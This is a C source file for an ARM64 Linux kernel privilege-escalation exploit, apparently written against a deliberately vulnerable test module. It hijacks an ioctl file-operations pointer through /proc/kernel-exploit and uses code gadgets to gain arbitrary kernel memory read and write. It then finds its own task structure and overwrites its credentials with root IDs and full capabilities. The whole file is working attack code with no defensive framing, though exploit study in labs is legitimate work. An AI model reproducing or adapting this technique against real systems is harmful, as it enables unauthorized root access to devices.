#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/ioctl.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define  NEW_PROC_NAME "exploit"
#define  KERNEL_BASE  0xffffffc000000000UL
static unsigned int task_offset = 0x490, comm_offset = 0x740, cred_offset = 0x738;

struct proc_data {
	void *addr;
	unsigned long val;
};

struct task_struct;
#define THREAD_SIZE 4096 * 4

struct thread_info {
	unsigned long           flags;          /* low level flags */
	unsigned long            addr_limit;     /* address limit */
	struct task_struct      *task;          /* main task structure */
	int                     preempt_count;  /* 0 => preemptable, <0 => bug */
	int                     cpu;            /* cpu */
};

#define ioctl_syscall(n, efd, cmd, arg) \
        eabi_syscall(n, efd, cmd, arg)

/*ffffff8008f18980 D init_task*/
#define INIT_TASK 0xffffff8008f18980UL

/*pci_bus_resource_n*/
/*ffffff80084a18c0 <pci_bus_resource_n>:*/
/*1113454 ffffff80084a1918:       f9400840        ldr     x0, [x2,#16]*/
/*1113455 ffffff80084a189c:       d65f03c0        ret*/

/*do_proc_dointvec_conv*/
/*ffffff80080c2ce8 <do_proc_dointvec_conv>:*/
/*70624 ffffff80080c2d0c:       b9000041        str     w1, [x2]*/
/*70625 ffffff80080c2d10:       d65f03c0        ret*/

/*ffffff8008f34ab0 D test_ioctl_fops*/

#define ROP_WRITE      0xffffff80080c2d0cUL
#define ROP_READ       0xffffff80084a1918UL
/*#define TEST_PRINT     0xffffff800825da5cUL*/

static fake_fd;

/*ffffff8008f34ab8 D test_ioctl_fops*/
#define TEST_IOCTL_FOPS 0xffffff8008f34ab0UL

int trigger(unsigned long dst)
{
	FILE *fd;
	struct proc_data local_data = {0};

	fd = fopen("/proc/kernel-exploit", "w");
	if (fd == NULL) {
		printf("open proc/kernel-exploit error\n");
		return -1;
	}
	unsigned long orig_ops = TEST_IOCTL_FOPS;

	local_data.addr = orig_ops + (9 * 8);
	local_data.val = dst;
	fwrite(&local_data, sizeof(long) * 2, 1, fd);
	fclose(fd);
}

static int kernel_write_32(unsigned long addr, unsigned int val)
{
	unsigned long arg;

	trigger(ROP_WRITE);

	arg = addr;
	ioctl_syscall(__NR_ioctl, fake_fd, val, arg);
	return 0;
}

static int kernel_write(unsigned long addr, unsigned long val)
{
	unsigned int val32;

	val32 = (unsigned int)val;
	kernel_write_32(addr, val32);

	val32 = (unsigned int)((val >> 32) & 0xffffffff);
	kernel_write_32(addr + 4, val32);
	return 0;
}

static int kernel_read_32(unsigned long addr, unsigned int *val)
{
	int ret;
	unsigned long arg;

	trigger(ROP_READ);

	arg = addr - 16;
	ret = ioctl_syscall(__NR_ioctl, fake_fd, 0xdeadbeef, arg);
	*val = ret;
	return 0;
}

static int kernel_read(unsigned long address, unsigned long *value)
{
	unsigned int val0, val1;

	kernel_read_32(address, &val0);
	kernel_read_32(address + 4, &val1);
	*value = ((unsigned long)val0 & 0xffffffff | ((unsigned long)val1 << 32) & 0xffffffff00000000);
}


static int get_task_by_comm(unsigned long *task)
{
	unsigned int comm0, comm1, comm2;
	unsigned long task_list, init_task_list, addr;
	int i, ret = 0;
	char task_name[50] = {0};

	/*
	 * follow the init_task->task list to search myself:
	 * next: swapper->init->kthreadd->...
	 * pre:  swapper->...->myself->...
	 */
	task_list = (INIT_TASK + task_offset);
	init_task_list = task_list;
	for (i = 0; i < 1000; i++) {
		/* search self process from tail */
		addr = task_list + 8;
		ret = kernel_read(addr, &task_list);

		if (task_list == init_task_list) {
			printf("search task list end, can't get task\n");
			return -1;
		}

		addr = task_list - task_offset + comm_offset;
		ret = kernel_read_32(addr, &comm0);

		addr = task_list - task_offset + comm_offset + 4;
		ret = kernel_read_32(addr, &comm1);

		addr = task_list - task_offset + comm_offset + 4 * 2;
		ret = kernel_read_32(addr, &comm2);

		memcpy(task_name, &comm0, 4);
		memcpy(task_name + 4, &comm1, 4);
		memcpy(task_name + 8, &comm2, 4);
		printf("task name %s\n", task_name);
		if (!strncmp(task_name, NEW_PROC_NAME, strlen(NEW_PROC_NAME))) {
			*task = task_list - task_offset;
			break;
		}

	}

	return 0;
}

static int do_root(unsigned  long my_task)
{
	int ret;
	unsigned long i, cred, addr;
	unsigned int tmp0;
	if (!my_task || (my_task < 0xffffffc000000000)) {
		printf("invalid task address!");
		return -2;
	}
	printf("task %lx\n", my_task);
	printf("to read cred %lx\n", my_task + cred_offset);

	ret = kernel_read(my_task + cred_offset, &cred);
	if (cred < KERNEL_BASE) {
		printf("cred %lx is wrong\n", cred);
		return -3;
	}

	i = 1;
	addr = cred + 4 * 4;
	ret = kernel_read_32(addr, &tmp0);
	if (tmp0 == 0x43736564 || tmp0 == 0x44656144)
		i += 4;
	addr = cred + (i + 0) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 1) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 2) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 3) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 4) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 5) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 6) * 4;
	ret = kernel_write_32(addr, 0);
	addr = cred + (i + 7) * 4;
	ret = kernel_write_32(addr, 0);

	//securebits: cred[i+8]
	// for full capabilities
	addr = cred + (i + 9) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 10) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 11) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 12) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 13) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 14) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 15) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	addr = cred + (i + 16) * 4;
	ret = kernel_write_32(addr, 0xffffffff);
	printf("exploit success\n");
	/* success! */
}



int test_rop()
{
	int fd = 0;
	int cmd;
	int arg = 0;
	char Buf[4096];
	unsigned long val;


	/*打开设备文件*/
	fake_fd = open("/dev/test_ioctl", O_RDWR);
	if (fd < 0) {
		printf("Open Dev Error!\n");
		return -1;
	}

	int fp;
	struct proc_data local_data = {0};

	fp = open("/proc/kernel-exploit", O_RDWR);
	if (fp == -1) {
		printf("open proc/kernel-exploit error\n");
		return -1;
	}
	unsigned long orig_ops = TEST_IOCTL_FOPS;
	unsigned long m_task;


	/* test rop success */
	kernel_write(0xffffffc000000008 + 0x80000000, 0xdeadbeefdeadbeaf);
	kernel_read(0xffffffc000000008 + 0x80000000, &val);
	printf("val %lx\n", val);

	/* get task from stack data */
	/*local_data.addr = NULL;*/
	/*local_data.val = 0;*/
	/*read(fp, &local_data, sizeof(long) * 2);*/
	/*printf("stack data %lx\n", local_data.val);*/
	/*struct thread_info *thread = (struct thread_info *)((local_data.val) & (~(THREAD_SIZE - 1)));*/
	/*struct thread_info *temp = (struct info *)malloc(sizeof(*temp));*/
	/*unsigned long task_offset = (unsigned long)&temp->task - (unsigned long)temp;*/
	/*printf("task offfset %lx\n", task_offset);*/
	/*printf("thread %lx\n", thread);*/
	/*unsigned long task;*/
	/*printf("to get task from %lx\n", (unsigned long)thread + task_offset);*/
	/*kernel_read((unsigned long)thread + task_offset, &task);*/

	/* get task from init task */
	get_task_by_comm(&m_task);

	/* root with task addr */
	do_root(m_task);
	close(fp);

	close(fake_fd);
	return 0;
}
